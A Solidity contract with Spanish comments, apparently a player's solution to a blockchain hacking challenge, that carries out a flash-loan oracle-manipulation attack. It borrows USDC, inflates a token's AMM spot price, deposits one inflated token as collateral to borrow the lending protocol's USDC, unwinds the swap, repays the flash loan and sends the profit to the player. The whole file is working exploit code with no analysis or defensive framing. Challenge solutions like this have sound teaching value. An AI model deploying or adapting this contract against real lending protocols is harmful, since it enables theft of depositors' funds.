// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Contrato que el jugador escribe y despliega desde la consola de Polonio.
interface ITok {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 a) external returns (bool);
    function transfer(address to, uint256 a) external returns (bool);
}
interface IAmmR {
    function swapUsdcForToken(uint256 usdcIn) external returns (uint256);
    function swapTokenForUsdc(uint256 tokenIn) external returns (uint256);
}
interface IFlash {
    function flashLoan(uint256 amount) external;
}
interface IPrest {
    function depositar(uint256 amt) external;
    function pedir(uint256 amt) external;
}

contract AtacanteOraculo {
    ITok immutable token;
    ITok immutable usdc;
    IAmmR immutable amm;
    IFlash immutable lender;
    IPrest immutable prestamos;
    address immutable jugador;

    constructor(address t, address u, address a, address l, address p) {
        token = ITok(t);
        usdc = ITok(u);
        amm = IAmmR(a);
        lender = IFlash(l);
        prestamos = IPrest(p);
        jugador = msg.sender;
    }

    // Antes de llamar, el jugador transfiere a este contrato su 1 TOKEN.
    function atacar() external {
        lender.flashLoan(900_000e18);
        // Beneficio para el jugador.
        usdc.transfer(jugador, usdc.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 amount) external {
        require(msg.sender == address(lender), "solo el prestamista");
        // 1. Inflar el precio spot del TOKEN con todo el USDC prestado.
        usdc.approve(address(amm), amount);
        amm.swapUsdcForToken(amount);
        // 2. Depositar 1 TOKEN propio y pedir todo el USDC del protocolo.
        token.approve(address(prestamos), 1e18);
        prestamos.depositar(1e18);
        prestamos.pedir(100_000e18);
        // 3. Deshacer el swap y recuperar el capital.
        uint256 restante = token.balanceOf(address(this));
        token.approve(address(amm), restante);
        amm.swapTokenForUsdc(restante);
        // 4. Devolver el préstamo flash.
        usdc.transfer(address(lender), amount);
    }
}
